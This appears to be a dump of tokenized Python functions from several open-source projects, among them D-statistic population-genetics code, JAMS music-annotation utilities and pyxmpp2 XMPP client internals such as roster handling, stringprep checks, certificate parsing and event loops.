pass raise inst ## dress up resarr as a Pandas DataFrame if 4-part test if len ( test ) == 4 : if not names : names = range ( len ( taxdicts ) ) #print("resarr") #print(resarr) resarr = pd . DataFrame ( resarr , index = names , columns = [ "dstat" , "bootmean" , "bootstd" , "Z" , "ABBA" , "BABA" , "nloci" ] ) ## sort results and bootsarr to match if test names were supplied resarr = resarr . sort_index ( ) order = [ list ( resarr . index ) . index ( i ) for i in names ] bootsarr = bootsarr [ order ] return resarr , bootsarr else : ## order results dfs listres = [ ] for key in range ( len ( paneldict ) ) : listres . append ( paneldict [ key ] ) ## make into a multi-index dataframe ntests = len ( paneldict ) multi_index = [ np . array ( [ [ i ] * 3 for i in range ( ntests ) ] ) . flatten ( ) , np . array ( [ 'p3' , 'p4' , 'shared' ] * ntests ) , ] resarr = pd . DataFrame ( data = pd . concat ( listres ) . as_matrix ( ) , index = multi_index , columns = listres [ 0 ] . columns , ) return resarr , None
def dstat ( inarr , taxdict , mindict = 1 , nboots = 1000 , name = 0 ) : #if isinstance(inarr, str): #    with open(inarr, 'r') as infile: #        inarr = infile.read().strip().split("|\n") # ## get data as an array from loci file # ## if loci-list then parse arr from loci if isinstance ( inarr , list ) : arr , _ = _loci_to_arr ( inarr , taxdict , mindict ) # ## if it's an array already then go ahead # elif isinstance(inarr, np.ndarray): #     arr = inarr # ## if it's a simulation object get freqs from array # elif isinstance(inarr, Sim): #     arr = _msp_to_arr(inarr, taxdict) #elif isinstance(inarr, types.GeneratorType): #    arr = _msp_to_arr(inarr, taxdict) #elif isinstance(inarr, list): #    arr = _msp_to_arr(inarr, taxdict) ## get data from Sim object, do not digest the ms generator #else: #    raise Exception("Must enter either a 'locifile' or 'arr'") ## run tests #if len(taxdict) == 4: if arr . shape [ 1 ] == 4 : ## get results res , boots = _get_signif_4 ( arr , nboots ) ## make res into a nice DataFrame res = pd . DataFrame ( res , columns = [ name ] , index = [ "Dstat" , "bootmean" , "bootstd" , "Z" , "ABBA" , "BABA" , "nloci" ] ) else : ## get results res , boots = _get_signif_5 ( arr , nboots ) ## make int a DataFrame res = pd . DataFrame ( res , index = [ "p3" , "p4" , "shared" ] , columns = [ "Dstat" , "bootmean" , "bootstd" , "Z" , "ABxxA" , "BAxxA" , "nloci" ] ) return res . T , boots
def _get_boots ( arr , nboots ) : ## hold results (nboots, [dstat, ]) boots = np . zeros ( ( nboots , ) ) ## iterate to fill boots for bidx in xrange ( nboots ) : ## sample with replacement lidx = np . random . randint ( 0 , arr . shape [ 0 ] , arr . shape [ 0 ] ) tarr = arr [ lidx ] _ , _ , dst = _prop_dstat ( tarr ) boots [ bidx ] = dst ## return bootarr return boots
def Async ( cls , token , session = None , * * options ) : return cls ( token , session = session , is_async = True , * * options )
def typecasted ( func ) : signature = inspect . signature ( func ) . parameters . items ( ) @ wraps ( func ) def wrapper ( * args , * * kwargs ) : args = list ( args ) new_args = [ ] new_kwargs = { } for _ , param in signature : converter = param . annotation if converter is inspect . _empty : converter = lambda a : a # do nothing if param . kind is param . POSITIONAL_OR_KEYWORD : if args : to_conv = args . pop ( 0 ) new_args . append ( converter ( to_conv ) ) elif param . kind is param . VAR_POSITIONAL : for a in args : new_args . append ( converter ( a ) ) else : for k , v in kwargs . items ( ) : nk , nv = converter ( k , v ) new_kwargs [ nk ] = nv return func ( * new_args , * * new_kwargs ) return wrapper
def list_namespaces ( ) : print ( '{:30s}\t{:40s}' . format ( 'NAME' , 'DESCRIPTION' ) ) print ( '-' * 78 ) for sch in sorted ( __NAMESPACE__ ) : desc = __NAMESPACE__ [ sch ] [ 'description' ] desc = ( desc [ : 44 ] + '..' ) if len ( desc ) > 46 else desc print ( '{:30s}\t{:40s}' . format ( sch , desc ) )
def __load_jams_schema ( ) : schema_file = os . path . join ( SCHEMA_DIR , 'jams_schema.json' ) jams_schema = None with open ( resource_filename ( __name__ , schema_file ) , mode = 'r' ) as fdesc : jams_schema = json . load ( fdesc ) if jams_schema is None : raise JamsError ( 'Unable to load JAMS schema' ) return jams_schema
def parse_arguments ( args ) : parser = argparse . ArgumentParser ( description = 'Convert JAMS to .lab files' ) parser . add_argument ( '-c' , '--comma-separated' , dest = 'csv' , action = 'store_true' , default = False , help = 'Output in .csv instead of .lab' ) parser . add_argument ( '--comment' , dest = 'comment_char' , type = str , default = '#' , help = 'Comment character' ) parser . add_argument ( '-n' , '--namespace' , dest = 'namespaces' , nargs = '+' , default = [ '.*' ] , help = 'One or more namespaces to output.  Default is all.' ) parser . add_argument ( 'jams_file' , help = 'Path to the input jams file' ) parser . add_argument ( 'output_prefix' , help = 'Prefix for output files' ) return vars ( parser . parse_args ( args ) )
def pitch_hz_to_contour ( annotation ) : annotation . namespace = 'pitch_contour' data = annotation . pop_data ( ) for obs in data : annotation . append ( time = obs . time , duration = obs . duration , confidence = obs . confidence , value = dict ( index = 0 , frequency = np . abs ( obs . value ) , voiced = obs . value > 0 ) ) return annotation
def note_hz_to_midi ( annotation ) : annotation . namespace = 'note_midi' data = annotation . pop_data ( ) for obs in data : annotation . append ( time = obs . time , duration = obs . duration , confidence = obs . confidence , value = 12 * ( np . log2 ( obs . value ) - np . log2 ( 440.0 ) ) + 69 ) return annotation
def scaper_to_tag ( annotation ) : annotation . namespace = 'tag_open' data = annotation . pop_data ( ) for obs in data : annotation . append ( time = obs . time , duration = obs . duration , confidence = obs . confidence , value = obs . value [ 'label' ] ) return annotation
def _key ( cls , obs ) : if not isinstance ( obs , Observation ) : raise JamsError ( '{} must be of type jams.Observation' . format ( obs ) ) return obs . time
def intervals ( annotation , * * kwargs ) : times , labels = annotation . to_interval_values ( ) return mir_eval . display . labeled_intervals ( times , labels , * * kwargs )
def hierarchy ( annotation , * * kwargs ) : htimes , hlabels = hierarchy_flatten ( annotation ) htimes = [ np . asarray ( _ ) for _ in htimes ] return mir_eval . display . hierarchy ( htimes , hlabels , * * kwargs )
def pitch_contour ( annotation , * * kwargs ) : ax = kwargs . pop ( 'ax' , None ) # If the annotation is empty, we need to construct a new axes ax = mir_eval . display . __get_axes ( ax = ax ) [ 0 ] times , values = annotation . to_interval_values ( ) indices = np . unique ( [ v [ 'index' ] for v in values ] ) for idx in indices : rows = [ i for ( i , v ) in enumerate ( values ) if v [ 'index' ] == idx ] freqs = np . asarray ( [ values [ r ] [ 'frequency' ] for r in rows ] ) unvoiced = ~ np . asarray ( [ values [ r ] [ 'voiced' ] for r in rows ] ) freqs [ unvoiced ] *= - 1 ax = mir_eval . display . pitch ( times [ rows , 0 ] , freqs , unvoiced = True , ax = ax , * * kwargs ) return ax
def event ( annotation , * * kwargs ) : times , values = annotation . to_interval_values ( ) if any ( values ) : labels = values else : labels = None return mir_eval . display . events ( times , labels = labels , * * kwargs )
def beat_position ( annotation , * * kwargs ) : times , values = annotation . to_interval_values ( ) labels = [ _ [ 'position' ] for _ in values ] # TODO: plot time signature, measure number return mir_eval . display . events ( times , labels = labels , * * kwargs )
def piano_roll ( annotation , * * kwargs ) : times , midi = annotation . to_interval_values ( ) return mir_eval . display . piano_roll ( times , midi = midi , * * kwargs )
def downbeat ( annotation , sr = 22050 , length = None , * * kwargs ) : beat_click = mkclick ( 440 * 2 , sr = sr ) downbeat_click = mkclick ( 440 * 3 , sr = sr ) intervals , values = annotation . to_interval_values ( ) beats , downbeats = [ ] , [ ] for time , value in zip ( intervals [ : , 0 ] , values ) : if value [ 'position' ] == 1 : downbeats . append ( time ) else : beats . append ( time ) if length is None : length = int ( sr * np . max ( intervals ) ) + len ( beat_click ) + 1 y = filter_kwargs ( mir_eval . sonify . clicks , np . asarray ( beats ) , fs = sr , length = length , click = beat_click ) y += filter_kwargs ( mir_eval . sonify . clicks , np . asarray ( downbeats ) , fs = sr , length = length , click = downbeat_click ) return y
def multi_segment ( annotation , sr = 22050 , length = None , * * kwargs ) : # Pentatonic scale, because why not PENT = [ 1 , 32. / 27 , 4. / 3 , 3. / 2 , 16. / 9 ] DURATION = 0.1 h_int , _ = hierarchy_flatten ( annotation ) if length is None : length = int ( sr * ( max ( np . max ( _ ) for _ in h_int ) + 1. / DURATION ) + 1 ) y = 0.0 for ints , ( oc , scale ) in zip ( h_int , product ( range ( 3 , 3 + len ( h_int ) ) , PENT ) ) : click = mkclick ( 440.0 * scale * oc , sr = sr , duration = DURATION ) y = y + filter_kwargs ( mir_eval . sonify . clicks , np . unique ( ints ) , fs = sr , length = length , click = click ) return y
def validate ( schema_file = None , jams_files = None ) : schema = load_json ( schema_file ) for jams_file in jams_files : try : jams = load_json ( jams_file ) jsonschema . validate ( jams , schema ) print '{:s} was successfully validated' . format ( jams_file ) except jsonschema . ValidationError as exc : print '{:s} was NOT successfully validated' . format ( jams_file ) print exc
def handle_authorized_event ( self , event ) : self . server = event . authorized_jid . bare ( ) if "versioning" in self . server_features : if self . roster is not None and self . roster . version is not None : version = self . roster . version else : version = u"" else : version = None self . request_roster ( version )
def _get_success ( self , stanza ) : payload = stanza . get_payload ( RosterPayload ) if payload is None : if "versioning" in self . server_features and self . roster : logger . debug ( "Server will send roster delta in pushes" ) else : logger . warning ( "Bad roster response (no payload)" ) self . _event_queue . put ( RosterNotReceivedEvent ( self , stanza ) ) return else : items = list ( payload ) for item in items : item . verify_roster_result ( True ) self . roster = Roster ( items , payload . version ) self . _event_queue . put ( RosterReceivedEvent ( self , self . roster ) )
def _get_error ( self , stanza ) : if stanza : logger . debug ( u"Roster request failed: {0}" . format ( stanza . error . condition_name ) ) else : logger . debug ( u"Roster request failed: timeout" ) self . _event_queue . put ( RosterNotReceivedEvent ( self , stanza ) )
def handle_roster_push ( self , stanza ) : if self . server is None and stanza . from_jid : logger . debug ( u"Server address not known, cannot verify roster push" " from {0}" . format ( stanza . from_jid ) ) return stanza . make_error_response ( u"service-unavailable" ) if self . server and stanza . from_jid and stanza . from_jid != self . server : logger . debug ( u"Roster push from invalid source: {0}" . format ( stanza . from_jid ) ) return stanza . make_error_response ( u"service-unavailable" ) payload = stanza . get_payload ( RosterPayload ) if len ( payload ) != 1 : logger . warning ( "Bad roster push received ({0} items)" . format ( len ( payload ) ) ) return stanza . make_error_response ( u"bad-request" ) if self . roster is None : logger . debug ( "Dropping roster push - no roster here" ) return True item = payload [ 0 ] item . verify_roster_push ( True ) old_item = self . roster . get ( item . jid ) if item . subscription == "remove" : if old_item : self . roster . remove_item ( item . jid ) else : self . roster . add_item ( item , replace = True ) self . _event_queue . put ( RosterUpdatedEvent ( self , old_item , item ) ) return stanza . make_result_response ( )
def free ( self ) : if not self . borrowed : self . xmlnode . unlinkNode ( ) self . xmlnode . freeNode ( ) self . xmlnode = None
def clear_muc_child ( self ) : if self . muc_child : self . muc_child . free_borrowed ( ) self . muc_child = None if not self . xmlnode . children : return n = self . xmlnode . children while n : if n . name not in ( "x" , "query" ) : n = n . next continue ns = n . ns ( ) if not ns : n = n . next continue ns_uri = ns . getContent ( ) if ns_uri in ( MUC_NS , MUC_USER_NS , MUC_ADMIN_NS , MUC_OWNER_NS ) : n . unlinkNode ( ) n . freeNode ( ) n = n . next
def map ( self , data ) : result = [ ] for char in data : ret = None for lookup in self . mapping : ret = lookup ( char ) if ret is not None : break if ret is not None : result . append ( ret ) else : result . append ( char ) return result
def prohibit ( self , data ) : for char in data : for lookup in self . prohibited : if lookup ( char ) : raise StringprepError ( "Prohibited character: {0!r}" . format ( char ) ) return data
def check_unassigned ( self , data ) : for char in data : for lookup in self . unassigned : if lookup ( char ) : raise StringprepError ( "Unassigned character: {0!r}" . format ( char ) ) return data
def check_bidi ( data ) : has_l = False has_ral = False for char in data : if stringprep . in_table_d1 ( char ) : has_ral = True elif stringprep . in_table_d2 ( char ) : has_l = True if has_l and has_ral : raise StringprepError ( "Both RandALCat and LCat characters present" ) if has_ral and ( not stringprep . in_table_d1 ( data [ 0 ] ) or not stringprep . in_table_d1 ( data [ - 1 ] ) ) : raise StringprepError ( "The first and the last character must" " be RandALCat" ) return data
def _configure_io_handler ( self , handler ) : if self . check_events ( ) : return if handler in self . _unprepared_handlers : old_fileno = self . _unprepared_handlers [ handler ] prepared = self . _prepare_io_handler ( handler ) else : old_fileno = None prepared = True fileno = handler . fileno ( ) if old_fileno is not None and fileno != old_fileno : tag = self . _io_sources . pop ( handler , None ) if tag is not None : glib . source_remove ( tag ) if not prepared : self . _unprepared_handlers [ handler ] = fileno if fileno is None : logger . debug ( " {0!r}.fileno() is None, not polling" . format ( handler ) ) return events = 0 if handler . is_readable ( ) : logger . debug ( " {0!r} readable" . format ( handler ) ) events |= glib . IO_IN | glib . IO_ERR if handler . is_writable ( ) : logger . debug ( " {0!r} writable" . format ( handler ) ) events |= glib . IO_OUT | glib . IO_HUP | glib . IO_ERR if events : logger . debug ( " registering {0!r} handler fileno {1} for" " events {2}" . format ( handler , fileno , events ) ) glib . io_add_watch ( fileno , events , self . _io_callback , handler )
def _prepare_pending ( self ) : if not self . _unprepared_pending : return for handler in list ( self . _unprepared_pending ) : self . _configure_io_handler ( handler ) self . check_events ( )
def _prepare_io_handler_cb ( self , handler ) : self . _anything_done = True logger . debug ( "_prepar_io_handler_cb called for {0!r}" . format ( handler ) ) self . _configure_io_handler ( handler ) self . _prepare_sources . pop ( handler , None ) return False
def _add_timeout_handler ( self , handler ) : # pylint: disable=W0212 for dummy , method in inspect . getmembers ( handler , callable ) : if not hasattr ( method , "_pyxmpp_timeout" ) : continue tag = glib . timeout_add ( int ( method . _pyxmpp_timeout * 1000 ) , self . _timeout_cb , method ) self . _timer_sources [ method ] = tag
def _remove_timeout_handler ( self , handler ) : for dummy , method in inspect . getmembers ( handler , callable ) : if not hasattr ( method , "_pyxmpp_timeout" ) : continue tag = self . _timer_sources . pop ( method , None ) if tag is not None : glib . source_remove ( tag )
def _timeout_cb ( self , method ) : self . _anything_done = True logger . debug ( "_timeout_cb() called for: {0!r}" . format ( method ) ) result = method ( ) # pylint: disable=W0212 rec = method . _pyxmpp_recurring if rec : self . _prepare_pending ( ) return True if rec is None and result is not None : logger . debug ( " auto-recurring, restarting in {0} s" . format ( result ) ) tag = glib . timeout_add ( int ( result * 1000 ) , self . _timeout_cb , method ) self . _timer_sources [ method ] = tag else : self . _timer_sources . pop ( method , None ) self . _prepare_pending ( ) return False
def _loop_timeout_cb ( self , main_loop ) : self . _anything_done = True logger . debug ( "_loop_timeout_cb() called" ) main_loop . quit ( )
def setup_stanza_handlers ( self , handler_objects , usage_restriction ) : # pylint: disable=W0212 iq_handlers = { "get" : { } , "set" : { } } message_handlers = [ ] presence_handlers = [ ] for obj in handler_objects : if not isinstance ( obj , XMPPFeatureHandler ) : continue obj . stanza_processor = self for dummy , handler in inspect . getmembers ( obj , callable ) : if not hasattr ( handler , "_pyxmpp_stanza_handled" ) : continue element_name , stanza_type = handler . _pyxmpp_stanza_handled restr = handler . _pyxmpp_usage_restriction if restr and restr != usage_restriction : continue if element_name == "iq" : payload_class = handler . _pyxmpp_payload_class_handled payload_key = handler . _pyxmpp_payload_key if ( payload_class , payload_key ) in iq_handlers [ stanza_type ] : continue iq_handlers [ stanza_type ] [ ( payload_class , payload_key ) ] = handler continue elif element_name == "message" : handler_list = message_handlers elif element_name == "presence" : handler_list = presence_handlers else : raise ValueError , "Bad handler decoration" handler_list . append ( handler ) with self . lock : self . _iq_handlers = iq_handlers self . _presence_handlers = presence_handlers self . _message_handlers = message_handlers
def _add_timeout_handler ( self , handler ) : # pylint: disable-msg=W0212 now = time . time ( ) for dummy , method in inspect . getmembers ( handler , callable ) : if not hasattr ( method , "_pyxmpp_timeout" ) : continue self . _timeout_handlers . append ( ( now + method . _pyxmpp_timeout , method ) ) self . _timeout_handlers . sort ( key = lambda x : x [ 0 ] )
def _remove_timeout_handler ( self , handler ) : self . _timeout_handlers = [ ( t , h ) for ( t , h ) in self . _timeout_handlers if h . im_self != handler ]
def _decode_subelements ( self ) : for child in self . _element : if child . tag == self . _subject_tag : self . _subject = child . text elif child . tag == self . _body_tag : self . _body = child . text elif child . tag == self . _thread_tag : self . _thread = child . text
def _move_session_handler ( handlers ) : index = 0 for i , handler in enumerate ( handlers ) : if isinstance ( handler , SessionHandler ) : index = i break if index : handlers [ : index + 1 ] = [ handlers [ index ] ] + handlers [ : index ]
def connect ( self ) : with self . lock : if self . stream : logger . debug ( "Closing the previously used stream." ) self . _close_stream ( ) transport = TCPTransport ( self . settings ) addr = self . settings [ "server" ] if addr : service = None else : addr = self . jid . domain service = self . settings [ "c2s_service" ] transport . connect ( addr , self . settings [ "c2s_port" ] , service ) handlers = self . _base_handlers [ : ] handlers += self . handlers + [ self ] self . clear_response_handlers ( ) self . setup_stanza_handlers ( handlers , "pre-auth" ) stream = ClientStream ( self . jid , self , handlers , self . settings ) stream . initiate ( transport ) self . main_loop . add_handler ( transport ) self . main_loop . add_handler ( stream ) self . _ml_handlers += [ transport , stream ] self . stream = stream self . uplink = stream
def disconnect ( self ) : with self . lock : if self . stream : if self . settings [ u"initial_presence" ] : self . send ( Presence ( stanza_type = "unavailable" ) ) self . stream . disconnect ( )
def _close_stream ( self ) : self . stream . close ( ) if self . stream . transport in self . _ml_handlers : self . _ml_handlers . remove ( self . stream . transport ) self . main_loop . remove_handler ( self . stream . transport ) self . stream = None self . uplink = None
def _stream_authenticated ( self , event ) : with self . lock : if event . stream != self . stream : return self . me = event . stream . me self . peer = event . stream . peer handlers = self . _base_handlers [ : ] handlers += self . handlers + [ self ] self . setup_stanza_handlers ( handlers , "post-auth" )
def _stream_authorized ( self , event ) : with self . lock : if event . stream != self . stream : return self . me = event . stream . me self . peer = event . stream . peer presence = self . settings [ u"initial_presence" ] if presence : self . send ( presence )
def _stream_disconnected ( self , event ) : with self . lock : if event . stream != self . stream : return if self . stream is not None and event . stream == self . stream : if self . stream . transport in self . _ml_handlers : self . _ml_handlers . remove ( self . stream . transport ) self . main_loop . remove_handler ( self . stream . transport ) self . stream = None self . uplink = None
def payload_class_for_element_name ( element_name ) : logger . debug ( " looking up payload class for element: {0!r}" . format ( element_name ) ) logger . debug ( "  known: {0!r}" . format ( STANZA_PAYLOAD_CLASSES ) ) if element_name in STANZA_PAYLOAD_CLASSES : return STANZA_PAYLOAD_CLASSES [ element_name ] else : return XMLPayload
def _deactivate ( self ) : self . cache . remove_fetcher ( self ) if self . active : self . _deactivated ( )
def _decode_asn1_string ( data ) : if isinstance ( data , BMPString ) : return bytes ( data ) . decode ( "utf-16-be" ) else : return bytes ( data ) . decode ( "utf-8" )
def from_ssl_socket ( cls , ssl_socket ) : cert = cls ( ) try : data = ssl_socket . getpeercert ( ) except AttributeError : # PyPy doesn't have .getppercert return cert logger . debug ( "Certificate data from ssl module: {0!r}" . format ( data ) ) if not data : return cert cert . validated = True cert . subject_name = data . get ( 'subject' ) cert . alt_names = defaultdict ( list ) if 'subjectAltName' in data : for name , value in data [ 'subjectAltName' ] : cert . alt_names [ name ] . append ( value ) if 'notAfter' in data : tstamp = ssl . cert_time_to_seconds ( data [ 'notAfter' ] ) cert . not_after = datetime . utcfromtimestamp ( tstamp ) if sys . version_info . major < 3 : cert . _decode_names ( ) # pylint: disable=W0212 cert . common_names = [ ] if cert . subject_name : for part in cert . subject_name : for name , value in part : if name == 'commonName' : cert . common_names . append ( value ) return cert
def from_ssl_socket ( cls , ssl_socket ) : try : data = ssl_socket . getpeercert ( True ) except AttributeError : # PyPy doesn't have .getpeercert data = None if not data : logger . debug ( "No certificate infromation" ) return cls ( ) result = cls . from_der_data ( data ) result . validated = bool ( ssl_socket . getpeercert ( ) ) return result
def _decode_subject ( self , subject ) : self . common_names = [ ] subject_name = [ ] for rdnss in subject : for rdns in rdnss : rdnss_list = [ ] for nameval in rdns : val_type = nameval . getComponentByName ( 'type' ) value = nameval . getComponentByName ( 'value' ) if val_type not in DN_OIDS : logger . debug ( "OID {0} not supported" . format ( val_type ) ) continue val_type = DN_OIDS [ val_type ] value = der_decoder . decode ( value , asn1Spec = DirectoryString ( ) ) [ 0 ] value = value . getComponent ( ) try : value = _decode_asn1_string ( value ) except UnicodeError : logger . debug ( "Cannot decode value: {0!r}" . format ( value ) ) continue if val_type == u"commonName" : self . common_names . append ( value ) rdnss_list . append ( ( val_type , value ) ) subject_name . append ( tuple ( rdnss_list ) ) self . subject_name = tuple ( subject_name )
def _decode_validity ( self , validity ) : not_after = validity . getComponentByName ( 'notAfter' ) not_after = str ( not_after . getComponent ( ) ) if isinstance ( not_after , GeneralizedTime ) : self . not_after = datetime . strptime ( not_after , "%Y%m%d%H%M%SZ" ) else : self . not_after = datetime . strptime ( not_after , "%y%m%d%H%M%SZ" ) self . alt_names = defaultdict ( list )
def from_file ( cls , filename ) : with open ( filename , "r" ) as pem_file : data = pem . readPemFromFile ( pem_file ) return cls . from_der_data ( data )
def main ( ) : parser = argparse . ArgumentParser ( description = 'XMPP echo bot' , parents = [ XMPPSettings . get_arg_parser ( ) ] ) parser . add_argument ( '--debug' , action = 'store_const' , dest = 'log_level' , const = logging . DEBUG , default = logging . INFO , help = 'Print debug messages' ) parser . add_argument ( '--quiet' , const = logging . ERROR , action = 'store_const' , dest = 'log_level' , help = 'Print only error messages' ) parser . add_argument ( '--trace' , action = 'store_true' , help = 'Print XML data sent and received' ) parser . add_argument ( '--roster-cache' , help = 'Store roster in this file' ) parser . add_argument ( 'jid' , metavar = 'JID' , help = 'The bot JID' ) subparsers = parser . add_subparsers ( help = 'Action' , dest = "action" ) show_p = subparsers . add_parser ( 'show' , help = 'Show roster and exit' ) show_p . add_argument ( '--presence' , action = 'store_true' , help = 'Wait 5 s for contact presence information' ' and display it with the roster' ) mon_p = subparsers . add_parser ( 'monitor' , help = 'Show roster and subsequent changes' ) mon_p . add_argument ( '--presence' , action = 'store_true' , help = 'Show contact presence changes too' ) add_p = subparsers . add_parser ( 'add' , help = 'Add an item to the roster' ) add_p . add_argument ( '--subscribe' , action = 'store_true' , dest = 'subscribe' , help = 'Request a presence subscription too' ) add_p . add_argument ( '--approve' , action = 'store_true' , dest = 'approve' , help = 'Pre-approve subscription from the contact' ' (requires server support)' ) add_p . add_argument ( 'contact' , metavar = 'CONTACT' , help = 'The JID to add' ) add_p . add_argument ( 'name' , metavar = 'NAME' , nargs = '?' , help = 'Contact name' ) add_p . add_argument ( 'groups' , metavar = 'GROUP' , nargs = '*' , help = 'Group names' ) rm_p = subparsers . add_parser ( 'remove' , help = 'Remove an item from the roster' ) rm_p . add_argument ( 'contact' , metavar = 'CONTACT' , help = 'The JID to remove' ) upd_p = subparsers . add_parser ( 'update' , help = 'Update an item in the roster' ) upd_p . add_argument ( 'contact' , metavar = 'CONTACT' , help = 'The JID to update' ) upd_p . add_argument ( 'name' , metavar = 'NAME' , nargs = '?' , help = 'Contact name' ) upd_p . add_argument ( 'groups' , metavar = 'GROUP' , nargs = '*' , help = 'Group names' ) args = parser . parse_args ( ) settings = XMPPSettings ( ) settings . load_arguments ( args ) if settings . get ( "password" ) is None : password = getpass ( "{0!r} password: " . format ( args . jid ) ) if sys . version_info . major < 3 : password = password . decode ( "utf-8" ) settings [ "password" ] = password if sys . version_info . major < 3 : args . jid = args . jid . decode ( "utf-8" ) if getattr ( args , "contact" , None ) : args . contact = args . contact . decode ( "utf-8" ) if getattr ( args , "name" , None ) : args . name = args . name . decode ( "utf-8" ) if getattr ( args , "groups" , None ) : args . groups = [ g . decode ( "utf-8" ) for g in args . groups ] logging . basicConfig ( level = args . log_level ) if args . trace : print "enabling trace" handler = logging . StreamHandler ( ) handler . setLevel ( logging . DEBUG ) for logger in ( "pyxmpp2.IN" , "pyxmpp2.OUT" ) : logger = logging . getLogger ( logger ) logger . setLevel ( logging . DEBUG ) logger . addHandler ( handler ) logger . propagate = False if args . action == "monitor" or args . action == "show" and args . presence : # According to RFC6121 it could be None for 'monitor' (no need to send # initial presence to request roster), but Google seems to require that # to send roster pushes settings [ "initial_presence" ] = Presence ( priority = - 1 ) else : settings [ "initial_presence" ] = None tool = RosterTool ( JID ( args . jid ) , args , settings ) try : tool . run ( ) except KeyboardInterrupt : tool . disconnect ( )
def run ( self ) : if self . args . roster_cache and os . path . exists ( self . args . roster_cache ) : logging . info ( u"Loading roster from {0!r}" . format ( self . args . roster_cache ) ) try : self . client . roster_client . load_roster ( self . args . roster_cache ) except ( IOError , ValueError ) , err : logging . error ( u"Could not load the roster: {0!r}" . format ( err ) ) self . client . connect ( ) self . client . run ( )
def _configure_io_handler ( self , handler ) : if self . check_events ( ) : return if handler in self . _unprepared_handlers : old_fileno = self . _unprepared_handlers [ handler ] prepared = self . _prepare_io_handler ( handler ) else : old_fileno = None prepared = True fileno = handler . fileno ( ) if old_fileno is not None and fileno != old_fileno : del self . _handlers [ old_fileno ] try : self . poll . unregister ( old_fileno ) except KeyError : # The socket has changed, but the old one isn't registered, # e.g. ``prepare`` wants to connect again pass if not prepared : self . _unprepared_handlers [ handler ] = fileno if not fileno : return self . _handlers [ fileno ] = handler events = 0 if handler . is_readable ( ) : logger . debug ( " {0!r} readable" . format ( handler ) ) events |= select . POLLIN if handler . is_writable ( ) : logger . debug ( " {0!r} writable" . format ( handler ) ) events |= select . POLLOUT if events : logger . debug ( " registering {0!r} handler fileno {1} for" " events {2}" . format ( handler , fileno , events ) ) self . poll . register ( fileno , events )
def remove ( self ) : if self . disco is None : return self . xmlnode . unlinkNode ( ) oldns = self . xmlnode . ns ( ) ns = self . xmlnode . newNs ( oldns . getContent ( ) , None ) self . xmlnode . replaceNs ( oldns , ns ) common_root . addChild ( self . xmlnode ( ) ) self . disco = None
def fetch ( self ) : from . . iq import Iq jid , node = self . address iq = Iq ( to_jid = jid , stanza_type = "get" ) disco = self . disco_class ( node ) iq . add_content ( disco . xmlnode ) self . stream . set_response_handlers ( iq , self . __response , self . __error , self . __timeout ) self . stream . send ( iq )
def handle_tls_connected_event ( self , event ) : if self . settings [ "tls_verify_peer" ] : valid = self . settings [ "tls_verify_callback" ] ( event . stream , event . peer_certificate ) if not valid : raise SSLError ( "Certificate verification failed" ) event . stream . tls_established = True with event . stream . lock : event . stream . _restart_stream ( )
def main ( ) : parser = argparse . ArgumentParser ( description = 'XMPP version checker' , parents = [ XMPPSettings . get_arg_parser ( ) ] ) parser . add_argument ( 'source' , metavar = 'SOURCE' , help = 'Source JID' ) parser . add_argument ( 'target' , metavar = 'TARGET' , nargs = '?' , help = 'Target JID (default: domain of SOURCE)' ) parser . add_argument ( '--debug' , action = 'store_const' , dest = 'log_level' , const = logging . DEBUG , default = logging . INFO , help = 'Print debug messages' ) parser . add_argument ( '--quiet' , const = logging . ERROR , action = 'store_const' , dest = 'log_level' , help = 'Print only error messages' ) args = parser . parse_args ( ) settings = XMPPSettings ( ) settings . load_arguments ( args ) if settings . get ( "password" ) is None : password = getpass ( "{0!r} password: " . format ( args . source ) ) if sys . version_info . major < 3 : password = password . decode ( "utf-8" ) settings [ "password" ] = password if sys . version_info . major < 3 : args . source = args . source . decode ( "utf-8" ) source = JID ( args . source ) if args . target : if sys . version_info . major < 3 : args . target = args . target . decode ( "utf-8" ) target = JID ( args . target ) else : target = JID ( source . domain ) logging . basicConfig ( level = args . log_level ) checker = VersionChecker ( source , target , settings ) try : checker . run ( ) except KeyboardInterrupt : checker . disconnect ( )
def handle_authorized ( self , event ) : request_software_version ( self . client , self . target_jid , self . success , self . failure )
def _decode_error ( self ) : error_qname = self . _ns_prefix + "error" for child in self . _element : if child . tag == error_qname : self . _error = StanzaErrorElement ( child ) return raise BadRequestProtocolError ( "Error element missing in" " an error stanza" )
def leave ( self ) : if self . joined : p = MucPresence ( to_jid = self . room_jid , stanza_type = "unavailable" ) self . manager . stream . send ( p )
def validate_string_list ( value ) : try : if sys . version_info . major < 3 : # pylint: disable-msg=W0404 from locale import getpreferredencoding encoding = getpreferredencoding ( ) value = value . decode ( encoding ) return [ x . strip ( ) for x in value . split ( u"," ) ] except ( AttributeError , TypeError , UnicodeError ) : raise ValueError ( "Bad string list" )
def stop ( self ) : with self . lock : for dummy in self . threads : self . queue . put ( None )
def _run ( self , thread_n ) : try : logger . debug ( "{0!r}: entering thread #{1}" . format ( self , thread_n ) ) resolver = self . _make_resolver ( ) while True : request = self . queue . get ( ) if request is None : break method , args = request logger . debug ( " calling {0!r}.{1}{2!r}" . format ( resolver , method , args ) ) getattr ( resolver , method ) ( * args ) # pylint: disable=W0142 self . queue . task_done ( ) logger . debug ( "{0!r}: leaving thread #{1}" . format ( self , thread_n ) ) finally : self . threads . remove ( threading . currentThread ( ) )
def _connect ( self , server = None , port = None ) : if self . me . node or self . me . resource : raise Value ( "Component JID may have only domain defined" ) if not server : server = self . server if not port : port = self . port if not server or not port : raise ValueError ( "Server or port not given" ) Stream . _connect ( self , server , port , None , self . me )
def _set_state ( self , state ) : logger . debug ( " _set_state({0!r})" . format ( state ) ) self . _state = state self . _state_cond . notify ( )
def _connect ( self , addr , port , service ) : self . _dst_name = addr self . _dst_port = port family = None try : res = socket . getaddrinfo ( addr , port , socket . AF_UNSPEC , socket . SOCK_STREAM , 0 , socket . AI_NUMERICHOST ) family = res [ 0 ] [ 0 ] sockaddr = res [ 0 ] [ 4 ] except socket . gaierror : family = None sockaddr = None if family is not None : if not port : raise ValueError ( "No port number given with literal IP address" ) self . _dst_service = None self . _family = family self . _dst_addrs = [ ( family , sockaddr ) ] self . _set_state ( "connect" ) elif service is not None : self . _dst_service = service self . _set_state ( "resolve-srv" ) self . _dst_name = addr elif port : self . _dst_nameports = [ ( self . _dst_name , self . _dst_port ) ] self . _dst_service = None self . _set_state ( "resolve-hostname" ) else : raise ValueError ( "No port number and no SRV service name given" )
